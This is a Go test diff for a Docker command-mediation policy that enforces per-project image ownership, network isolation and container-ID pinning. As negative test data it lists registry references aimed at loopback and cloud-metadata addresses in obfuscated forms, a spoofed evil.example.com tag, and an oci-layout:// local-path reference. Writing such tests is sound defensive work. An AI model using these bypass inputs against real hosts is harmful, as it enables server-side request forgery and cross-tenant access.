+	t.Parallel()
+	for _, tt := range []struct {
+		argv    []string
+		regrant string
+	}{
+		{receive("/space/mnt/shop-prod/data:/mnt/data", "devopsy::data/", "/mnt/data/"), "/space/mnt/shop-prod/data"},
+		{receive("/space/mnt/shop-prod/app.ini:/mnt/app.ini", "--inplace", "devopsy::app.ini/app.ini", "/mnt/app.ini"), "/space/mnt/shop-prod/app.ini"},
+		{receive("shop-prod_db:/vol/db", "devopsy::db/", "/vol/db/"), ""},
+	} {
+		a, err := decide(t, tt.argv...)
+		if err != nil {
+			t.Errorf("%q: %v", tt.argv, err)
+			continue
+		}
+		if !strings.Contains(strings.Join(a.Docker, " "), "--network none") || len(a.Entries) != 0 || (tt.regrant != "") != slices.Contains(a.Regrant, tt.regrant) {
+			t.Errorf("%q: %q, entries %+v, regrant %q", tt.argv, a.Docker, a.Entries, a.Regrant)
+		}
+	}
+	// A file entry written other than in place, into its directory, or a directory into a file.
+	for _, argv := range [][]string{
+		receive("/space/mnt/shop-prod/app.ini:/mnt/app.ini", "devopsy::app.ini/app.ini", "/mnt/app.ini"),
+		receive("/space/mnt/shop-prod/app.ini:/mnt/app.ini", "--inplace", "devopsy::app.ini/app.ini", "/mnt/app.ini/"),
+		receive("/space/mnt/shop-prod/data:/mnt/data", "devopsy::data/", "/mnt/data"),
+		receive("shop-prod_db:/vol/db", "devopsy::db/db", "/vol/db"),
+	} {
+		if a, err := decide(t, argv...); err == nil {
+			t.Errorf("%q: %q", argv, a.Docker)
 		}
 	}
 }
@@ -557,10 +710,8 @@ func TestDecideRunNarrowsAnRsync(t *testing.T) {
 		want string
 		file bool
 	}{
-		{"a local entry", []string{"run", "-v", "/space/mnt/shop-prod:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "/src/data/", "/dst/data/"}, "/space/mnt/shop-dev/data:/dst/data", false},
-		{"a local file", []string{"run", "-v", "/space/mnt/shop-prod:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "--inplace", "/src/app.ini", "/dst/"}, "/space/mnt/shop-dev/app.ini:/dst/app.ini", true},
-		{"a receive", []string{"run", "--network", "host", "-e", "RSYNC_PASSWORD", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "rsync", "-a", "rsync://127.0.0.1:9/data/", "/mnt/data/"}, "/space/mnt/shop-prod/data:/mnt/data", false},
-		{"a file received", []string{"run", "--network", "host", "-e", "RSYNC_PASSWORD", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "rsync", "-a", "--inplace", "rsync://127.0.0.1:9/app.ini/app.ini", "/mnt/"}, "/space/mnt/shop-prod/app.ini:/mnt/app.ini", true},
+		{"a local entry", []string{"run", "-v", "/space/mnt/shop-prod:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "/src/data/", "/dst/data/"}, "type=bind,source=/space/mnt/shop-dev/data,target=/dst/data", false},
+		{"a local file", []string{"run", "-v", "/space/mnt/shop-prod:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "--inplace", "/src/app.ini", "/dst/"}, "type=bind,source=/space/mnt/shop-dev/app.ini,target=/dst/app.ini", true},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -577,13 +728,250 @@ func TestDecideRunNarrowsAnRsync(t *testing.T) {
 			}
 		})
 	}
-	// A file by a local rsync with no --inplace, and a receive into a mnt with no entry.
+	// A file by a local rsync with no --inplace.
 	for _, argv := range [][]string{
 		{"run", "-v", "/space/mnt/shop-prod:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "/src/app.ini", "/dst/"},
-		{"run", "--network", "host", "-e", "RSYNC_PASSWORD", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "rsync", "-a", "rsync://127.0.0.1:9/data/", "/mnt/"},
 	} {
 		if a, err := decide(t, argv...); err == nil {
 			t.Errorf("%q: %q", argv, a.Docker)
+		}
+	}
+}
+
+// An image is this project's when only it writes one of its names (a build of its own, a
+// hold of its own), or when it claimed it: pulled with its own registry logins, the id
+// recorded. Any other is claimed first, whatever the request (an inspect, a tag's source,
+// a pull), so another project's image, built or pulled with that project's logins, is
+// never this one's by being on disk: an inspect would read its Env, a tag would make it a
+// hold of this project's. A claim may not write another project's hold.
+func TestDecideImagesItsOwnOrClaimed(t *testing.T) {
+	t.Parallel()
+	p := testPolicy
+	p.Others = []string{"blog"}
+	p.Images = []string{"sha256:eee"}
+	claims := func(argv ...string) []string {
+		t.Helper()
+		a, err := Decide(argv, p, testDaemon, &fakeHost{}, testKnown)
+		if err != nil {
+			t.Fatalf("%q: %v", argv, err)
+		}
+		return a.Claims
+	}
+	for _, image := range []string{"devopsy.internal/shop-prod/web", "devopsy.internal/shop-prod/web:latest", "sha256:aaa", "busybox:devopsy-shop-prod-20240101000000", "sha256:bbb", "postgres:16", testKnown.Image} {
+		if c := claims("image", "inspect", "--format", "{{.Id}}", image); len(c) != 0 {
+			t.Errorf("its own %s claimed: %v", image, c)
+		}
+		if c := claims("tag", image, "busybox:devopsy-shop-prod-20240101000001"); len(c) != 0 {
+			t.Errorf("a tag of its own %s claimed: %v", image, c)
+		}
+	}
+	// (Another project's build name or hold is refused outright: TestClaimWritesNoHoldAndNoBuildName.)
+	for _, image := range []string{"sha256:ccc", "registry.example.com/blog/private:1", "sha256:fff", "nginx:1", "sha256:0123", "shop-prod-web", "sha256:abd", "blog-prod-web"} {
+		if c := claims("image", "inspect", image); !slices.Equal(c, []string{image}) {
+			t.Errorf("another's or nobody's %s answered unclaimed: %v", image, c)
+		}
+		if c := claims("tag", image, "busybox:devopsy-shop-prod-20240101000001"); !slices.Equal(c, []string{image}) {
+			t.Errorf("a tag of %s, unclaimed: %v", image, c)
+		}
+	}
+	if c := claims("pull", "-q", "postgres:16"); !slices.Equal(c, []string{"postgres:16"}) {
+		t.Errorf("a pull is a claim: %v", c)
+	}
+	// A tag's source this project owns by its image (claimed, or named by a hold of its
+	// own) goes to Docker by the id the door read: the name is anyone's on the server to
+	// move before the tag, which would make another's image a hold of this project's. A name
+	// only this project writes stays as it is. (A claimed source goes by the digest its
+	// claim got, the door's to put in: TestDoorClaimActsByDigest.)
+	for image, want := range map[string]string{"postgres:16": "sha256:", "devopsy.internal/shop-prod/web": "devopsy.internal/shop-prod/web"} {
+		a, err := Decide([]string{"tag", image, "busybox:devopsy-shop-prod-20240101000001"}, p, testDaemon, &fakeHost{}, testKnown)
+		if err != nil || len(a.Docker) != 3 || !strings.HasPrefix(a.Docker[1], want) || a.Docker[1] == "postgres:16" {
+			t.Errorf("a tag of its own %s tags %v (%v)", image, a, err)
+		}
+		// An inspect reads its configuration (Env, build arguments) by the same id, for the
+		// same reason.
+		a, err = Decide([]string{"image", "inspect", "--format", "{{json .}}", image}, p, testDaemon, &fakeHost{}, testKnown)
+		if err != nil || len(a.Claims) != 0 || !strings.HasPrefix(a.Docker[len(a.Docker)-1], want) || slices.Contains(a.Docker, "postgres:16") {
+			t.Errorf("an inspect of its own %s reads %v (%v)", image, a, err)
+		}
+	}
+	// A tag puts a hold of its own (a release's bookmark, which a record tags) on an image of
+	// its own, never a name another reads, nor its build's plain name, the door's build to
+	// write.
+	if _, err := Decide([]string{"tag", "sha256:aaa", "devopsy.internal/shop-prod/web"}, p, testDaemon, &fakeHost{}, testKnown); err == nil {
+		t.Error("a tag onto its build's plain name")
+	}
+	for _, target := range []string{"devopsy.internal/shop-prod/web:devopsy-shop-prod-20240101000001", "busybox:devopsy-shop-stage-1"} {
+		if _, err := Decide([]string{"tag", "sha256:aaa", target}, p, testDaemon, &fakeHost{}, testKnown); err != nil {
+			t.Errorf("a tag onto its own %s: %v", target, err)
+		}
+	}
+	for _, argv := range [][]string{
+		{"tag", "sha256:aaa", "shop-prod-web"},
+		{"tag", "sha256:aaa", "devopsy.internal/blog-prod/web"},
+		{"tag", "sha256:aaa", "devopsy.internal/shop-prod/web:devopsy-blog-prod-1"},
+		{"pull", "-q", "registry.example.com/x:devopsy-blog-prod-20240101000000"},
+		{"image", "inspect", "busybox:devopsy-blog-prod-20240101000000"},
+		{"tag", "busybox:devopsy-blog-prod-20240101000000", "busybox:devopsy-shop-prod-20240101000001"},
+		{"tag", "--help", "busybox:devopsy-shop-prod-20240101000001"},
+		{"image", "inspect", "--help"},
+	} {
+		if a, err := Decide(argv, p, testDaemon, &fakeHost{}, testKnown); err == nil {
+			t.Errorf("%q: taken: %+v", argv, a)
+		}
+	}
+}
+
+// No pull writes a name the door takes for one a project alone writes (OwnRef): a hold, any
+// project's (its rollback and restart run it by name), and a build's name under
+// devopsy.internal, this project's own included. A pull lands where a registry's manifest
+// points, and Docker fetches no layer it holds, so a registry naming another project's
+// layers would make that image this project's by its name, with no claim and no proof. A
+// claim (its pull, an inspect, a tag's source, a start) and compose's pull verb refuse them
+// alike. Any other name is a registry's (no build is named so, DoorBuild): a project named
+// mongo does not make mongo-express:1 its own, and another project claims it.
+func TestNoPullWritesAHoldOrABuildName(t *testing.T) {
+	t.Parallel()
+	p := testPolicy
+	p.Others = []string{"blog"}
+	for _, ref := range []string{
+		"devopsy.internal/blog-prod/web", "devopsy.internal/blog-prod/web:latest", "registry.example.com/x:devopsy-blog-prod-20240101000000",
+		"evil.example.com/x:devopsy-shop-prod-1", "busybox:devopsy-shop-prod-20240101000000",
+		"devopsy.internal/shop-prod/web", "devopsy.internal/shop-prod/web:devopsy-shop-prod-1",
+	} {
+		argvs := [][]string{{"pull", "-q", ref}}
+		if !p.OwnRef(ref) {
+			argvs = append(argvs, []string{"image", "inspect", ref}, []string{"tag", ref, "busybox:devopsy-shop-prod-20240101000001"})
+		}
+		for _, argv := range argvs {
+			if a, err := Decide(argv, p, testDaemon, &fakeHost{}, testKnown); err == nil {
+				t.Errorf("%q: taken, a pull writing a name taken as a project's own: %+v", argv, a)
+			}
+		}
+		// Compose's pull verb: another's refused, one of its own left out (PlanPull): it
+		// writes neither.
+		file := parse(t, `{"name":"shop-prod","services":{"web":`+safe(``)+`}}`)
+		web := file["services"].(map[string]any)["web"].(map[string]any)
+		web["image"] = ref
+		if errs := CheckFile(file, p, "pull", &fakePaths{}); len(errs) == 0 {
+			if pull, err := PlanPull(file, []string{"web"}, []string{"pull"}, p); err != nil || len(pull.Images) == 0 {
+				continue
+			}
+			t.Errorf("compose's pull of %s is taken", ref)
+		}
+	}
+	// The controls: a registry's name is claimed, under a project's name or not, and blog's
+	// own build name is blog's to read.
+	for _, ref := range []string{"postgres:16", "blog-prod-web", "blog-express:1", "evil.example.com/x:1"} {
+		if a, err := Decide([]string{"pull", "-q", ref}, p, testDaemon, &fakeHost{}, testKnown); err != nil || len(a.Claims) != 1 {
+			t.Errorf("the control, a registry's %s: %v, %+v", ref, err, a)
+		}
+	}
+	blog := Policy{Project: "blog", User: "devopsy-blog", Space: "/space", Tree: "/home/devopsy-blog/blog", Others: []string{"shop"}}
+	if a, err := Decide([]string{"image", "inspect", "devopsy.internal/blog-prod/web"}, blog, testDaemon, &fakeHost{}, testKnown); err != nil || len(a.Claims) != 0 {
+		t.Errorf("the control, blog's own build for blog: %v, %+v", err, a)
+	}
+}
+
+// A pull or a login names no registry on the server's own loopback, link-local or metadata
+// addresses: Docker's daemon, root outside the project users' firewall, would contact it for
+// that project user, and its answers (a port open or not, an error page) come back. Any other
+// host is a registry's, a private address included (one on the server's own bridge, or
+// another server's). Each is read as Docker and a C resolver read it: a first part with a
+// capital is a registry's host (Localhost/x), a host is the same in any case (LOCALHOST), and a
+// name inet_aton reads as an address (127.1, 0x7f.1, 0x7f000001, 127.0.0.0x1) is that address.
+// By digest too: a digest writes no name, but the daemon still contacts its host.
+func TestNoRegistryOfTheServersOwn(t *testing.T) {
+	t.Parallel()
+	for _, ref := range []string{
+		"127.0.0.1:5000/x:1", "localhost:5000/x", "localhost/x", "reg.localhost/x", "[::1]:5000/x",
+		"169.254.169.254/latest:1", "[fe80::1]:5000/x", "[::ffff:127.0.0.1]:5000/x", "[fd00:ec2::254]/x",
+		"100.100.100.200/x", "168.63.129.16/x", "127.1:5000/x", "0x7f.1/x", "0.0.0.0:5000/x",
+		"0177.0.0.1:5000/x", "LOCALHOST:5000/x:1", "Localhost/x:1", "reg.LocalHost:5000/x", "0x7f000001:5000/x",
+		"127.0.0.0x1:5000/x", "0x7f.0.0.0x1:5000/x", "0xa9fea9fe:5000/x", "169.254.169.0xfe:5000/x", "0X7F000001:5000/x",
+	} {
+		// By digest too, which writes no name but still has the daemon contact the host, and
+		// through compose's pull verb, which hands the reference to the daemon as it is.
+		file := parse(t, `{"name":"shop-prod","services":{"web":`+safe(``)+`}}`)
+		file["services"].(map[string]any)["web"].(map[string]any)["image"] = ref + testDigest
+		if errs := CheckFile(file, testPolicy, "pull", &fakePaths{}); len(errs) == 0 {
+			t.Errorf("compose's pull of %s is taken", ref+testDigest)
+		}
+		for _, r := range []string{ref, ref + testDigest} {
+			if err := testPolicy.Claimable(r); err == nil {
+				t.Errorf("a pull of %s is taken", r)
+			}
+		}
+	}
+	for _, ref := range []string{
+		"registry.example.com/x:1", "10.0.0.5:5000/x", "172.17.0.1:5003/x", "nginx:1", "ghcr.io/x/y:1", "library/2130706433:1",
+		"Registry.Example.com/x:1", "0x7f.example.com:5000/x", "registry.example.com/x" + testDigest,
+	} {
+		if err := testPolicy.Claimable(ref); err != nil {
+			t.Errorf("a pull of %s: %v", ref, err)
+		}
+	}
+}
+
+const testDigest = "@sha256:0000000000000000000000000000000000000000000000000000000000000000"
+
+// idDaemon is a daemon that, as Docker does, takes a container by a name or a prefix of its id
+// and answers with its full id.
+type idDaemon struct{ fakeDaemon }
+
+const mineID = "4f1c9e0a7b2d4f1c9e0a7b2d4f1c9e0a7b2d4f1c9e0a7b2d4f1c9e0a7b2d4f1c"
+
+func (d idDaemon) Inspect(target string) (string, map[string]string, error) {
+	if target == "4f1" || target == mineID {
+		target = "mine"
+	}
+	_, labels, err := d.fakeDaemon.Inspect(target)
+	if err != nil {
+		return "", nil, err
+	}
+	return mineID, labels, nil
+}
+
+// A container request (inspect, rm, the sync daemon's exec) goes to Docker by the full id the
+// door's check read, never the caller's word: a name or an id's prefix Docker would read anew,
+// another project's container by then (the first gone, a new id under the same prefix), whose
+// environment an inspect would show and a rm -f remove.
+func TestDecideActsOnTheContainerItRead(t *testing.T) {
+	t.Parallel()
+	d := idDaemon{testDaemon}
+	for _, argv := range [][]string{
+		{"inspect", "--format", "{{json .Config.Env}}", "4f1"},
+		{"inspect", "mine"},
+		{"rm", "-f", "4f1"},
+		{"rm", "mine"},
+		slices.Concat([]string{"exec", "-i", "4f1"}, DaemonServe),
+	} {
+		a, err := Decide(argv, testPolicy, d, &fakeHost{}, testKnown)
+		if err != nil {
+			t.Errorf("%q: %v", argv, err)
+			continue
+		}
+		if !slices.Contains(a.Docker, mineID) || slices.Contains(a.Docker, "4f1") || slices.Contains(a.Docker, "mine") {
+			t.Errorf("%q: Docker resolves the caller's word again: %q", argv, a.Docker)
+		}
+	}
+}
+
+// A claim takes only a name of Docker's (images.IsReference): buildx's imagetools reads
+// `oci-layout://<path>:<tag>` as a local layout as the deploy user, so a pull, an inspect or a
+// tag's source naming one is refused before anything runs.
+func TestClaimableTakesOnlyADockerReference(t *testing.T) {
+	t.Parallel()
+	layout := "oci-layout:///srv/space/work/blog-123/layout:claim"
+	if err := testPolicy.Claimable(layout); err == nil {
+		t.Errorf("Claimable takes %s", layout)
+	}
+	for _, argv := range [][]string{
+		{"pull", "-q", layout},
+		{"image", "inspect", layout},
+		{"tag", layout, "busybox:devopsy-shop-prod-20240101000000"},
+	} {
+		if a, err := decide(t, argv...); err == nil {
+			t.Errorf("%q: not refused, claims %q", argv, a.Claims)
 		}
 	}
 }
